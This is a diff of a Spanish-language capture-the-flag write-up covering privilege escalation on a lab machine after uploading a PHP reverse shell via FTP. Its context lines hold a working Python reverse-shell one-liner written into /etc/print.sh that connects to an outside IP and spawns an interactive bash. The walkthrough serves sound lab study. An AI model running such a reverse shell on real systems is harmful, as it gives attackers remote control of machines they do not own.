@@ -41,7 +41,7 @@ Podemos listar dentro de la raiz /files/ftp/revshell.php nuestra shell inversa, 
 
 Podemos enumerar un usuario llamado lennie, listemos los permisos SUID que tiene el usuario www-data, para poder escalar privilegios, intentamos ver, pero no encontramos nada en las conexiones a la escucha o archivos en los que tengamos permisos
 ![[Pasted image 20240412083227.png]]
-Dentro de la carpeta raiz encontramos una carpeta llamada incidentes con las contraseñas captadas de una comuncicación de ncap
+Dentro de la carpeta raíz encontramos una carpeta llamada incidentes con la contraseña posible de  captadas de una comunicación de ncap
 
 ![[1_VdH_oe1-qVobhaIbvnIQbQ.webp]]
 
@@ -63,6 +63,7 @@ cat > /etc/print.sh << EOF
 #!/bin/bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.255.131",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 EOF
+
 ![[Pasted image 20240412085714.png]]
 ![[Pasted image 20240412085733.png]]
 
